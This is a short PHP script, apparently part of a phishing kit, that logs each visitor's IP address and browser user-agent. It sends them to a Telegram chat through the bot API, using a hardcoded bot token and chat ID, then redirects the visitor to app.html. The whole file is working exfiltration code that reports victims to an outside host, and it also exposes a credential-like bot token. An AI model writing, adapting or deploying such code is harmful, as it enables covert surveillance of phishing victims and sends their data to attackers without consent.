<?php

// Get IP address - compatible with all servers
$zabi = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : (getenv("REMOTE_ADDR") ? getenv("REMOTE_ADDR") : 'Unknown');

// Initialize message
$message = "";

$message .= "THIS IS IN AUTH.HTML\n";

$message .= "----------- IP Infos -------\n";

$message .= "IP       : $zabi\n";

$message .= "BROWSER  : ".(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown')."\n";

$message .= "------------------------------------\n";

$token = "9142645407:AAFVYD6en1Tf_OTQFxkz-JRA8mVOSw7Zvgg";

$data = array(
    'text' => $message,
    'chat_id' => '-5325729427'
);

@file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data));

// Redirect to app.html
header("Location: app.html");

// Exit the script
exit();

?>
